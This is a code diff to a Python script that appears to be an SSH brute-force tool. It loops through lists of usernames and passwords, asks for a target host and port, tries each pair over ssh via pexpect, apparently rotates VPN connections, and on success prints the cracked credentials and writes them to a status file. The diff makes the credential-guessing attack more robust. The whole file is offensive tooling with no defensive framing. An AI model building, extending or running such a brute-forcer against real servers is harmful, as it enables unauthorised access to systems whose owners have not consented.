@@ -6,8 +6,8 @@ import vpn
 import users
 from pathlib import Path
 
-passwordsl = passwords.passwords_
-usersl = users.users_
+passwordsl = passwords.load_passwords()
+usersl = users.load_users()
 openvpn_enter = vpn.openvpn_enter_()
 
 finded = False
@@ -21,13 +21,14 @@ SHELL = "shell"
 DENIED = "denied"
 END = "end"
 TIMEOUT = "timeout"
+SSH_TIMEOUT = 30
 
 
 def update_status(line_number, value):
     status_file = Path("/tmp/status")
     with status_file.open("r", encoding="utf-8") as f:
         lines = f.readlines()
-    while len(lines) < 5:
+    while len(lines) <= line_number:
         lines.append("\n")
     lines[line_number] = f"{value}\n"
     temporary_file = status_file.with_suffix(".tmp")
@@ -49,7 +50,7 @@ def expect_state(process, states):
 i = int(input("Qual o valor inicial do usuário: "))
 j = int(input("Qual o valor inicial da senha: "))
 
-destino = str(input("Qual o destino: "))
+host = str(input("Qual o destino: "))
 port = str(input("Qual a porta: "))
 
 next_ = random.randint(30, 45)
@@ -67,9 +68,9 @@ while i < len(usersl):
 
         process = pexpect.spawn(
             "ssh",
-            [f"{usersl[i]}@{destino}", "-p", port],
+            [f"{usersl[i]}@{host}", "-p", port],
             encoding="utf-8",
-            timeout=10,
+            timeout=SSH_TIMEOUT,
         )
 
         try:
@@ -110,13 +111,19 @@ while i < len(usersl):
             result = TIMEOUT
 
         if result == SHELL:
+            user1 = usersl[i]
             password = passwordsl[j]
+
+            print(user1)
             print(password)
+
             process.close()
 
             finded = True
 
             update_status(3, "True")
+            update_status(5, user1)
+            update_status(6, password)
 
             break
 
